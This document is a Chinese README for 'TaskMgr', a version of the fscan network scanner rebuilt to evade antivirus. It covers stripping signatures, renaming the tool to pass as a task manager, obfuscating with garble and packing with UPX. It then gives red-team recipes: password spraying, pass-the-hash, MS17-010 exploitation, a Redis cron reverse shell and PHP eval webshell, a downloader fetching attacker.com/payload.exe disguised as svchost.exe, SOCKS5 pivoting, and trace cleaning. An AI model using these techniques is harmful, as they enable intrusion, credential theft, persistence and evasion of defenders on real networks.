# TaskMgr 使用说明

基于 fscan v2.1.4 免杀改造版。

## 免杀方案

### 1. 静态特征清除

| 修改项 | 原值 | 新值 |
|--------|------|------|
| 模块名 | `github.com/shadow1ng/fscan` | `taskmgr/netcheck` |
| 目标 IP 参数 | `-h` | `-i` |
| IP 文件参数 | `-hf` | `-if` |
| 排除 IP 参数 | `-eh` | `-xi` |
| 排除 IP 文件 | `-ehf` | `-xif` |
| 输出文件 | `result.txt` | `report.dat` |
| 调试日志 | `fscan_debug.log` | `taskmgr_debug.log` |
| Banner 名称 | `Fscan` | `TaskMgr` |
| POC 格式标识 | `fscan` | `native` |
| Web 缓存目录 | `~/.fscan/` | `~/.taskmgr/` |
| 探针标识字符串 | `fscan.test` / `fscan-web-detector` / `fscan-downloader` | 对应替换 |
| 清理插件匹配模式 | `fscan*` / `FSCAN*` | `taskmgr*` / `TASKMGR*` |
| 嵌入的 i18n 翻译文件 | `# fscan 中文翻译文件` | 去除 fscan 字样 |
| 嵌入的 POC 示例模板 | `fscan-dev` / `shadow1ng/fscan` | 去除 |

115 个 Go 源文件全局替换 import 路径，所有嵌入资源（翻译文件、POC 模板、杀软特征库 JSON）中的 fscan 子串全部清除。

### 2. 编译混淆

```bash
garble -tiny -seed=random build -ldflags="-w -s" -trimpath -o output.exe main.go
```

- `garble -tiny`：混淆包路径、函数名、类型名，移除调试信息
- `-w -s`：去除 DWARF 调试表和符号表
- `-trimpath`：去除编译路径信息
- **不使用 `-literals`**：字符串混淆会导致体积暴增 10 倍，且经测试不需要即可过火绒

### 3. 加壳压缩

```bash
upx -9 -o output_upx.exe output.exe
```

`-9` 最高压缩比。Linux/Windows 体积从 ~47M 降至 ~14M。

> macOS (Mach-O) 不支持 UPX，体积保持 ~47M。

### 4. 效果验证

```bash
strings taskmgr.exe | grep -c fscan
# 输出：0（除 Go 运行时内部标识 _GCoffscanObject 外无 fscan 特征）
```

火绒最新版无检测。

---

## 使用方法

### 参数对照表

原 fscan 用户迁徙看这里，其他参数不变：

| 原 fscan 参数 | 新参数 | 说明 |
|---------------|--------|------|
| `-h 192.168.1.1` | `-i 192.168.1.1` | 指定目标 IP |
| `-h 192.168.1.0/24` | `-i 192.168.1.0/24` | CIDR 网段 |
| `-h 192.168.1.1-100` | `-i 192.168.1.1-100` | IP 范围 |
| `-hf ip.txt` | `-if ip.txt` | IP 列表文件 |
| `-eh 192.168.1.1` | `-xi 192.168.1.1` | 排除 IP |
| `-ehf exclude.txt` | `-xif exclude.txt` | 排除 IP 文件 |

### 常用命令

#### 基础扫描

```bash
# 扫描单个 IP 的默认端口
./taskmgr_linux_amd64 -i 192.168.1.1

# 扫描单个 IP 指定端口
./taskmgr_linux_amd64 -i 192.168.1.1 -p 22,80,443,3306,6379

# 扫描单个 IP 1-1000 端口
./taskmgr_linux_amd64 -i 192.168.1.1 -p 1-1000

# 扫描 IP 范围
./taskmgr_linux_amd64 -i 192.168.1.1-192.168.1.254 -p 80,443

# 批量扫描（从文件读取 IP）
./taskmgr_linux_amd64 -if targets.txt -p 22,80,443,445,3389
```

#### 排除目标

```bash
# 排除单个 IP
./taskmgr_linux_amd64 -i 192.168.1.0/24 -xi 192.168.1.1

# 排除多个 IP（逗号分隔）
./taskmgr_linux_amd64 -i 192.168.1.0/24 -xi 192.168.1.1,192.168.1.254

# 从文件排除
./taskmgr_linux_amd64 -i 192.168.1.0/24 -xif exclude.txt

# 排除端口
./taskmgr_linux_amd64 -i 192.168.1.0/24 -p 1-1000 -ep 80,443
```

#### 扫描模式

```bash
# 完整扫描（默认，包含全部功能）
./taskmgr_linux_amd64 -i 192.168.1.0/24 -m all

# 仅存活检测
./taskmgr_linux_amd64 -i 192.168.1.0/24 -m icmp

# 仅存活检测 + 不补充 TCP 探测
./taskmgr_linux_amd64 -i 192.168.1.0/24 -m icmp -ntp

# 仅端口扫描（跳过服务识别和漏洞检测）
./taskmgr_linux_amd64 -i 192.168.1.0/24 -m portscan

# 仅存活检测并保存结果（不扫描端口）
./taskmgr_linux_amd64 -i 192.168.1.0/24 -ao

# 禁用 Ping 探测（纯 TCP 扫描）
./taskmgr_linux_amd64 -i 192.168.1.1 -np
```

#### 性能调优

```bash
# 默认线程数 600，调整线程数
./taskmgr_linux_amd64 -i 192.168.1.0/24 -t 1000

# 调整超时时间（秒）
./taskmgr_linux_amd64 -i 192.168.1.0/24 -time 5

# 调整模块线程数（弱口令爆破等模块）
./taskmgr_linux_amd64 -i 192.168.1.0/24 -mt 50

# 全局超时（分钟），默认 180
./taskmgr_linux_amd64 -i 10.0.0.0/8 -gt 60

# ICMP 发包速率（秒），默认 0.1
./taskmgr_linux_amd64 -i 192.168.1.0/24 -m icmp -icmp-rate 0.05
```

#### 凭据爆破

```bash
# 指定单个用户名和密码
./taskmgr_linux_amd64 -i 192.168.1.1 -user admin -pwd admin123

# 指定多个用户和密码（逗号分隔）
./taskmgr_linux_amd64 -i 192.168.1.1 -user admin,root -pwd 123456,admin

# 从文件加载用户名字典
./taskmgr_linux_amd64 -i 192.168.1.1 -userf users.txt -pwdf pass.txt

# 使用 user:pass 格式文件
./taskmgr_linux_amd64 -i 192.168.1.1 -upf userpass.txt

# NTLM Hash 认证
./taskmgr_linux_amd64 -i 192.168.1.1 -hash 32ED87BDB5FDC5E9CBA88547376818D4

# 从文件加载 Hash
./taskmgr_linux_amd64 -i 192.168.1.1 -hashf hashes.txt

# 域认证
./taskmgr_linux_amd64 -i 192.168.1.1 -user administrator -pwd Admin123 -domain corp.local

# SSH 密钥认证
./taskmgr_linux_amd64 -i 192.168.1.1 -user root -sshkey id_rsa

# 禁用弱口令爆破
./taskmgr_linux_amd64 -i 192.168.1.0/24 -nobr

# 重试次数
./taskmgr_linux_amd64 -i 192.168.1.1 -user admin -pwd admin123 -retry 5
```

#### 输出控制

```bash
# 默认输出为 txt（保存到 report.dat）
./taskmgr_linux_amd64 -i 192.168.1.0/24 -o result.txt

# JSON 格式输出
./taskmgr_linux_amd64 -i 192.168.1.0/24 -f json -o result.json

# CSV 格式输出
./taskmgr_linux_amd64 -i 192.168.1.0/24 -f csv -o result.csv

# 不保存输出文件
./taskmgr_linux_amd64 -i 192.168.1.0/24 -no

# 静默模式（NDJSON 输出到 stdout，适合管道）
./taskmgr_linux_amd64 -i 192.168.1.0/24 -silent | jq 'select(.type=="VULN")'

# 无颜色输出
./taskmgr_linux_amd64 -i 192.168.1.0/24 -nocolor

# 禁用进度条
./taskmgr_linux_amd64 -i 192.168.1.0/24 -nopg
```

#### 终端颜色标记

| 前缀 | 颜色 | 场景 |
|------|------|------|
| `[*]` | 白色 | 端口开放、服务识别、Web 标题 |
| `[+]` | 绿色 | Web 指纹识别、NetBIOS/SMB 信息 |
| `[!]` | **红色** | POC 命中、弱口令、未授权访问、MS17-010、SMB 匿名访问 |
| `[-]` | 黄色 | 连接失败、超时、插件错误 |

#### 调试与日志

```bash
# 开启调试模式（输出详细日志到 taskmgr_debug.log）
./taskmgr_linux_amd64 -i 192.168.1.1 -debug

# 指定日志级别，可选 debug/info/success/error
./taskmgr_linux_amd64 -i 192.168.1.1 -log debug

# 输出性能统计 JSON
./taskmgr_linux_amd64 -i 192.168.1.0/24 -perf
```

#### Web 漏洞扫描

```bash
# 扫描单个 URL
./taskmgr_linux_amd64 -u https://target.com

# 批量扫描 URL（从文件读取）
./taskmgr_linux_amd64 -uf urls.txt

# 带 Cookie 扫描
./taskmgr_linux_amd64 -u https://target.com -cookie "SESSION=xxx"

# Web 超时设置（秒）
./taskmgr_linux_amd64 -u https://target.com -wt 10

# 最大重定向次数
./taskmgr_linux_amd64 -u https://target.com -max-redirect 5

# 指定自定义 POC 路径
./taskmgr_linux_amd64 -u https://target.com -pocpath /path/to/pocs

# 指定单个 POC 名称
./taskmgr_linux_amd64 -u https://target.com -pocname CVE-2021-44228

# 并发 POC 数量
./taskmgr_linux_amd64 -u https://target.com -num 50

# 全量 POC 扫描（不使用智能过滤）
./taskmgr_linux_amd64 -u https://target.com -full

# DNSLog 模式（检测无回显漏洞）
./taskmgr_linux_amd64 -u https://target.com -dns

# 禁用 POC 扫描
./taskmgr_linux_amd64 -u https://target.com -nopoc
```

#### 代理配置

```bash
# HTTP 代理
./taskmgr_linux_amd64 -i 10.0.0.0/8 -proxy http://127.0.0.1:8080

# SOCKS5 代理
./taskmgr_linux_amd64 -i 10.0.0.0/8 -socks5 127.0.0.1:1080

# 绑定网卡
./taskmgr_linux_amd64 -i 10.0.0.0/8 -iface eth1
```

#### Redis 利用

```bash
# 写公钥
./taskmgr_linux_amd64 -i 192.168.1.1 -p 6379 -rf id_rsa.pub

# 写定时任务反弹 shell
./taskmgr_linux_amd64 -i 192.168.1.1 -p 6379 -rsh 192.168.1.100:4444

# 自定义写文件
./taskmgr_linux_amd64 -i 192.168.1.1 -p 6379 -rwf /var/www/html/shell.php -rwc '<?php @eval($_POST["x"]);?>'

# 禁用 Redis 利用
./taskmgr_linux_amd64 -i 192.168.1.1 -noredis
```

#### 本地插件

```bash
# 系统信息收集
./taskmgr_linux_amd64 -local systeminfo

# 杀软检测
./taskmgr_linux_amd64 -local avdetect

# 痕迹清理
./taskmgr_linux_amd64 -local cleaner

# 域控信息收集
./taskmgr_linux_amd64 -local dcinfo

# 下载文件
./taskmgr_linux_amd64 -local downloader -download-url http://attacker.com/payload.exe -download-path C:\\Windows\\Temp\\svchost.exe

# 开启 SOCKS5 服务端
./taskmgr_linux_amd64 -local socks5proxy -start-socks5 1080

# 开启转发 Shell
./taskmgr_linux_amd64 -local forwardshell -fsh-port 4444
```

#### 其他

```bash
# Web 管理界面模式
./taskmgr_linux_amd64 -i 192.168.1.0/24 -web -web-port 8888

# 发包限速（每秒最多 N 个包）
./taskmgr_linux_amd64 -i 192.168.1.0/24 -rate 1000

# 中文/英文切换
./taskmgr_linux_amd64 -i 192.168.1.0/24 -lang en

# 查看帮助
./taskmgr_linux_amd64 -help
```

### Windows 版本使用

```cmd
REM 基础扫描
taskmgr_windows_amd64.exe -i 192.168.1.0/24 -p 22,80,443,445,3389

REM 从文件批量扫描（端口扫描 + 服务识别 + 漏洞检测 + 弱口令爆破）
taskmgr_windows_amd64.exe -if ip.txt -np -o result.txt

REM 输出 JSON 格式结果
taskmgr_windows_amd64.exe -if ip.txt -np -o result.txt -f json

REM 全量 POC 扫描（强制对所有 Web 服务跑全部 388 个 POC）
taskmgr_windows_amd64.exe -if ip.txt -np -full -o result.txt

REM Web 模式扫描（仅 HTTP 探测 + POC，不扫端口）
taskmgr_windows_amd64.exe -uf urls.txt -np -o result.txt

REM 禁 Ping + SOCKS5 代理
taskmgr_windows_amd64.exe -i 10.0.0.0/8 -np -socks5 127.0.0.1:1080 -m portscan
```

### ⚠️ 常见错误

| 错误命令 | 正确命令 | 说明 |
|----------|----------|------|
| `-hf ip.txt` | `-if ip.txt` | 原版 fscan 的 `-hf` 已更名为 `-if` |
| `-h 192.168.1.1` | `-i 192.168.1.1` | 原版 `-h` 已更名为 `-i` |
| `-eh 192.168.1.1` | `-xi 192.168.1.1` | 原版 `-eh` 已更名为 `-xi` |

```cmd
REM ❌ 错误 - 会报 flag provided but not defined: -hf
taskmgr_windows_amd64.exe -hf ip.txt -np -o result.txt

REM ✅ 正确
taskmgr_windows_amd64.exe -if ip.txt -np -o result.txt

### macOS 版本使用

```bash
# x86_64
./taskmgr_darwin_amd64 -i 192.168.1.0/24

# Apple Silicon (M1/M2/M3)
./taskmgr_darwin_arm64 -i 192.168.1.0/24
```

---

## 红队实战命令

### 场景一：快速内网踩点

刚拿到入口，快速摸清内网存活主机和关键端口。

```bash
# 探测 C 段存活主机（不扫端口，速度快）
./taskmgr_linux_amd64 -i 10.0.0.0/24 -m icmp -np -nopoc -nobr -o alive_hosts.txt

# 存活主机 + 常见端口快速扫描
./taskmgr_linux_amd64 -i 10.0.0.0/24 -p 22,80,443,445,3389,3306,6379,1433,8080,8443 -nopoc -nobr

# 禁用 Ping（防火墙禁 ICMP 时使用）
./taskmgr_linux_amd64 -i 10.0.0.0/24 -np -p 22,80,443,445,3389,8080
```

### 场景二：全面端口扫描

已知存活主机，全端口 + 服务识别 + 漏洞检测。

```bash
# 单主机 1-65535 全端口 + 服务识别
./taskmgr_linux_amd64 -i 10.0.0.10 -p 1-65535 -o target_full.json -f json

# 多主机扫描（从存活列表读取）
./taskmgr_linux_amd64 -if alive_hosts.txt -p 1-10000 -o intranet_scan.json -f json

# B 段大规模扫描（自动跳过空子网）
./taskmgr_linux_amd64 -i 10.0.0.0/16 -p 22,80,443,445,3389,3306,6379,1433,8080,8443 -nobr -nopoc
```

### 场景三：弱口令爆破

发现关键服务后，针对性爆破。

```bash
# 多服务通用爆破
./taskmgr_linux_amd64 -i 10.0.0.10 -p 22,3306,1433,445,21,6379 \
  -userf users.txt -pwdf pass.txt -retry 2 -o brute_result.json -f json

# SSH 批量爆破
./taskmgr_linux_amd64 -if linux_hosts.txt -p 22 -m ssh \
  -user root -pwdf top500.txt -t 100 -o ssh_result.txt

# MSSQL 爆破（域用户 + 本地用户混用）
./taskmgr_linux_amd64 -if mssql_hosts.txt -p 1433 \
  -user sa,admin -pwdf pass.txt -domain corp.local

# MySQL 爆破
./taskmgr_linux_amd64 -if mysql_hosts.txt -p 3306 \
  -user root,admin -pwdf pass.txt

# RDP 爆破（NLA 验证模式，不挤掉已登录用户）
./taskmgr_linux_amd64 -if rdp_hosts.txt -p 3389 \
  -user administrator -pwdf pass.txt

# SMB 爆破
./taskmgr_linux_amd64 -if smb_hosts.txt -p 445 \
  -user administrator -pwdf pass.txt

# 内网通用密码喷洒（一个密码测全网）
./taskmgr_linux_amd64 -if all_hosts.txt -p 22,445,3306,1433 \
  -pwd P@ssw0rd2024 -user administrator,root,sa -retry 1
```

### 场景四：域环境信息收集

```bash
# 扫描整个网段 + NetBIOS + 域控识别
./taskmgr_linux_amd64 -i 10.0.0.0/24 -p 88,389,636,445,135,139 -o dc_scan.json -f json

# 定向扫描域控
./taskmgr_linux_amd64 -i 10.0.0.2 -p 88,389,636,445,3268,3269 -nobr -nopoc

# 使用域凭据 + Hash 认证
./taskmgr_linux_amd64 -i 10.0.0.0/24 -p 445,389 \
  -user administrator -hash 32ED87BDB5FDC5E9CBA88547376818D4 -domain corp.local
```

### 场景五：Web 资产探测

```bash
# 内网 Web 资产快速梳理（指纹 + 标题）
./taskmgr_linux_amd64 -i 10.0.0.0/24 -p 80,443,8080,8443,9090,7001,7002,8888 \
  -m webscan -o web_assets.json -f json

# 指定 URL 全量 POC 扫描
./taskmgr_linux_amd64 -u https://10.0.0.10:8443 -full -num 50 -o poc_result.json -f json

# 批量 URL POC 扫描
./taskmgr_linux_amd64 -uf web_urls.txt -full -o web_poc.json -f json

# 自定义 POC 目录扫描（自研 POC）
./taskmgr_linux_amd64 -u https://target.com -pocpath /opt/custom_pocs -full
```

### 场景六：MS17-010 / 永恒之蓝

```bash
# 全网段 MS17-010 检测
./taskmgr_linux_amd64 -i 10.0.0.0/16 -p 445 -m ms17010 -o ms17010_result.txt

# 单主机 MS17-010 利用
./taskmgr_linux_amd64 -i 10.0.0.10 -p 445 -m ms17010
```

### 场景七：Redis 未授权利用

```bash
# Redis 未授权扫描
./taskmgr_linux_amd64 -i 10.0.0.0/24 -p 6379 -nobr -nopoc

# 写 SSH 公钥
./taskmgr_linux_amd64 -i 10.0.0.10 -p 6379 -rf id_rsa.pub

# 写计划任务反弹 shell
./taskmgr_linux_amd64 -i 10.0.0.10 -p 6379 -rsh 192.168.1.100:4444

# 写 Webshell
./taskmgr_linux_amd64 -i 10.0.0.10 -p 6379 \
  -rwf /var/www/html/shell.php -rwc '<?php @eval($_POST["cmd"]);?>'
```

### 场景八：SOCKS5 代理内网穿透

```bash
# 在被控主机开启 SOCKS5 服务端
./taskmgr_linux_amd64 -local socks5proxy -start-socks5 1080

# Attacker 通过 SOCKS5 扫描内网
./taskmgr_linux_amd64 -i 10.0.0.0/24 -socks5 127.0.0.1:1080 \
  -p 22,80,443,445,3389 -np -nopoc -nobr
```

### 场景九：静默模式（自动化/C2 管道）

```bash
# NDJSON 输出，无 Banner 无进度条，适合 AI/C2 消费
./taskmgr_linux_amd64 -i 10.0.0.0/24 -silent -p 22,80,443,445 2>/dev/null

# JSON 流式解析：只提取漏洞
./taskmgr_linux_amd64 -i 10.0.0.0/24 -silent -p 22,80,443,445 | jq 'select(.type=="VULN")'

# 提取所有弱口令
./taskmgr_linux_amd64 -i 10.0.0.0/24 -silent | jq -r 'select(.username != null) | "\(.host):\(.port) \(.service) \(.username):\(.password)"'

# 提取所有 Web 资产
./taskmgr_linux_amd64 -i 10.0.0.0/24 -silent | jq -r 'select(.url != null) | "\(.url) \(.title)"'
```

### 场景十：本地信息收集与清理

```bash
# 杀软检测
./taskmgr_linux_amd64 -local avdetect

# 系统信息收集
./taskmgr_linux_amd64 -local systeminfo

# 域控信息（Windows）
./taskmgr_linux_amd64 -local dcinfo

# 痕迹清理（扫描完成后）
./taskmgr_linux_amd64 -local cleaner
```

### 常见端口速查

| 服务 | 端口 |
|------|------|
| Web | 80, 443, 8080, 8443, 9090, 7001, 7002, 8888, 4848 |
| 数据库 | 3306(MySQL), 1433(MSSQL), 1521(Oracle), 5432(PostgreSQL), 6379(Redis), 27017(MongoDB) |
| 远程管理 | 22(SSH), 3389(RDP), 5900(VNC), 23(Telnet) |
| 文件共享 | 445(SMB), 21(FTP), 139/135(NetBIOS), 2049(NFS), 873(Rsync) |
| 域服务 | 88(Kerberos), 389(LDAP), 636(LDAPS), 3268/3269(GC) |
| 中间件 | 61616(ActiveMQ), 5672(RabbitMQ), 9092(Kafka), 11211(Memcached), 9200(ES) |
| 邮件 | 25(SMTP), 110(POP3), 143(IMAP) |
| 其他 | 161(SNMP), 502(Modbus), 2181(Zookeeper), 2375/2376(Docker) |

---

## 编译方法

```bash
# 1. 安装 garble
go install mvdan.cc/garble@latest

# 2. 编译（Linux 为例）
GOOS=linux GOARCH=amd64 garble -tiny -seed=random build \
  -ldflags="-w -s" -trimpath \
  -o taskmgr_linux_amd64 main.go

# 3. 压缩（可选，macOS 不支持）
upx -9 -o taskmgr_linux_amd64_upx taskmgr_linux_amd64

# 4. 验证特征清除
strings taskmgr_linux_amd64_upx | grep -c fscan
```

## 各平台编译命令

```bash
# Linux x64
GOOS=linux GOARCH=amd64 garble -tiny -seed=random build -ldflags="-w -s" -trimpath -o taskmgr_linux_amd64 main.go

# Windows x64
GOOS=windows GOARCH=amd64 garble -tiny -seed=random build -ldflags="-w -s" -trimpath -o taskmgr_windows_amd64.exe main.go

# Windows x32
GOOS=windows GOARCH=386 garble -tiny -seed=random build -ldflags="-w -s" -trimpath -o taskmgr_windows_386.exe main.go

# macOS x64
GOOS=darwin GOARCH=amd64 garble -tiny -seed=random build -ldflags="-w -s" -trimpath -o taskmgr_darwin_amd64 main.go

# macOS ARM64 (Apple Silicon)
GOOS=darwin GOARCH=arm64 garble -tiny -seed=random build -ldflags="-w -s" -trimpath -o taskmgr_darwin_arm64 main.go
```
